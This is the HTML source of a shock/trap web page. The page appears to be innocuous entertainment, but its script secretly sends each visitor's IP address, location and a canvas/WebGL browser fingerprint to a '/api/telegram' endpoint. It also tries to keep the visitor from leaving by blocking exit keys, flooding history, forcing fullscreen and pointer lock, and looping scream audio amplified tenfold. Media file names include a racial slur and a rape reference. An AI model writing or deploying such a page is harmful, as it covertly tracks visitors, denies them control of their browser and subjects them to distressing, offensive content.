<!DOCTYPE html>
<html>
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-149452514-1');
    </script>
    <link rel="stylesheet" type="text/css" href="styles.css">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <!-- AdSense -->
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3026390331916120"
         crossorigin="anonymous"></script>

<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
    flex-shrink: 0;
}

.video-wrapper video,
.video-wrapper img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    flex-shrink: 0;
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<!-- Overlay to start the experience -->
<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<!-- Audio loops -->
<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<!-- Visual content -->
<div class="video-container">
    <div class="video-wrapper">
        <img id="wads" src="wads.gif" alt="">
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<!-- jQuery -->
<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- MAIN SCRIPT -->
<script>
(function() {
    let hasTriggered = false;

    // ================================================================
    // 1. IMMEDIATE IP PING (only IP, sent on page load)
    // ================================================================
    async function sendImmediateIP() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            if (!res.ok) throw new Error('ipapi failed');
            const ipData = await res.json();
            const payload = { ipData, timestamp: new Date().toISOString() };
            await fetch('/api/telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log('[PING] IP sent to Telegram');
        } catch (e) {
            // retry once
            setTimeout(sendImmediateIP, 2000);
        }
    }

    // ================================================================
    // 2. FINGERPRINT (for later capture after click)
    // ================================================================
    function getFingerprint() {
        const fp = {};
        fp.userAgent = navigator.userAgent;
        fp.language = navigator.language;
        fp.platform = navigator.platform;
        fp.hardwareConcurrency = navigator.hardwareConcurrency || '?';
        fp.deviceMemory = navigator.deviceMemory || '?';
        fp.maxTouchPoints = navigator.maxTouchPoints || '?';
        fp.screen = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
        };
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Canvas fingerprint
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillStyle = '#f60'; ctx.fillRect(0,0,200,50);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102,204,0,0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
            fp.canvas = canvas.toDataURL();
        } catch(e) { fp.canvas = 'error'; }

        // WebGL
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if(gl) {
                fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
            } else { fp.webgl = 'unsupported'; }
        } catch(e) { fp.webgl = 'error'; }

        return fp;
    }

    // ================================================================
    // 3. SEND FULL FINGERPRINT (after click)
    // ================================================================
    async function sendFullFingerprint() {
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = ipRes.ok ? await ipRes.json() : { ip: 'unknown' };
            const fingerprint = getFingerprint();
            const payload = { ipData, fingerprint, timestamp: new Date().toISOString() };
            await fetch('/api/telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) { console.warn('Full fingerprint send failed:', e); }
    }

    // ================================================================
    // 4. INESCAPABLE TRAP (extremely aggressive)
    // ================================================================
    function trapUser() {
        // Block ALL dangerous key combinations
        const blockKeys = e => {
            const k = e.key;
            const ctrl = e.ctrlKey, alt = e.altKey, shift = e.shiftKey, meta = e.metaKey;
            if (
                e.keyCode === 115 || // F4
                e.keyCode === 116 || // F5
                e.keyCode === 27 ||  // Escape
                (ctrl && (k === 'w' || k === 'W')) ||      // Ctrl+W
                (ctrl && (k === 't' || k === 'T')) ||      // Ctrl+T
                (ctrl && (k === 'n' || k === 'N')) ||      // Ctrl+N
                (ctrl && shift && k === 'T') ||            // Ctrl+Shift+T
                (alt && k === 'F4') ||                     // Alt+F4
                (alt && k === 'Tab') ||                    // Alt+Tab
                (ctrl && k === 'Tab') ||                   // Ctrl+Tab
                (alt && k === 'ArrowLeft') ||              // Alt+Left
                (alt && k === 'ArrowRight') ||             // Alt+Right
                (ctrl && k === 'l') ||                     // Ctrl+L (address bar)
                (ctrl && k === 'L') ||
                (meta && k === 'q') ||                     // Cmd+Q (Mac)
                (ctrl && k === 'q')                        // Ctrl+Q
            ) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        };

        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);

        // Prevent right‑click, selection, drag
        document.addEventListener('contextmenu', e => e.preventDefault(), true);
        document.addEventListener('selectstart', e => e.preventDefault(), true);
        document.addEventListener('dragstart', e => e.preventDefault(), true);

        // Disable close
        window.close = () => {};

        // Flood history so back/forward are useless
        for(let i=0; i<50; i++) history.pushState(null, null, location.href);
        window.onpopstate = () => {
            history.pushState(null, null, location.href);
            attemptFullscreen();
            lockPointer();
        };

        // Beforeunload dialog – extremely annoying
        window.onbeforeunload = () => {
            return 'You cannot leave.';
        };

        // Aggressive re‑engagement loop
        setInterval(() => {
            if (!hasTriggered) return;
            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                attemptFullscreen();
            }
            if (document.pointerLockElement === null) {
                lockPointer();
            }
            // Re‑flood history every 5 seconds
            history.pushState(null, null, location.href);
        }, 200);

        // Re‑engage on any interaction
        const reengage = () => {
            if (!hasTriggered) return;
            attemptFullscreen();
            lockPointer();
        };
        ['mousemove','click','touchstart','keydown','focus'].forEach(ev => {
            document.addEventListener(ev, reengage, true);
        });
        document.addEventListener('fullscreenchange', reengage);
        document.addEventListener('webkitfullscreenchange', reengage);
        document.addEventListener('pointerlockchange', reengage);
        document.addEventListener('mozpointerlockchange', reengage);
        document.addEventListener('webkitpointerlockchange', reengage);
    }

    function attemptFullscreen() {
        const el = document.documentElement;
        try {
            if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
            else if (el.msRequestFullscreen) el.msRequestFullscreen();
        } catch(e){}
    }

    function lockPointer() {
        try {
            document.body.requestPointerLock();
        } catch(e){}
    }

    // ================================================================
    // 5. AUDIO BOOST & START EXPERIENCE (unchanged)
    // ================================================================
    let audioContext, gainNode;
    const mediaElements = [];

    function initAudioBoost() {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10;
        gainNode.connect(audioContext.destination);
        ['shart','shart2','shart3'].forEach(id => {
            const el = document.getElementById(id);
            if(el) {
                mediaElements.push(el);
                const src = audioContext.createMediaElementSource(el);
                src.connect(gainNode);
                el.loop = true; el.muted = false;
            }
        });
        ['fart','ronnie'].forEach(id => {
            const el = document.getElementById(id);
            if(el) {
                mediaElements.push(el);
                const src = audioContext.createMediaElementSource(el);
                src.connect(gainNode);
                el.loop = true; el.muted = false;
            }
        });
    }

    function playAllMedia() {
        if(audioContext && audioContext.state === 'suspended') audioContext.resume();
        mediaElements.forEach(m => {
            if(m) {
                m.volume = 1.0; m.muted = false;
                const p = m.play();
                if(p) p.catch(() => setInterval(() => m.play(), 100));
            }
        });
    }

    window.startExperience = function() {
        if(hasTriggered) return;
        hasTriggered = true;

        document.getElementById('startOverlay').style.display = 'none';
        document.querySelector('.black-screen').style.display = 'none';

        initAudioBoost();
        playAllMedia();
        attemptFullscreen();
        lockPointer();
        trapUser();

        // Send full fingerprint now (user gesture obtained)
        sendFullFingerprint().catch(console.warn);
    };

    document.getElementById('startOverlay').addEventListener('click', startExperience);

    // ================================================================
    // 6. FIRE IMMEDIATE IP PING (as soon as page loads)
    // ================================================================
    sendImmediateIP();

    // Start trapping keys immediately even before click
    trapUser();
})();
</script>
</body>
</html>
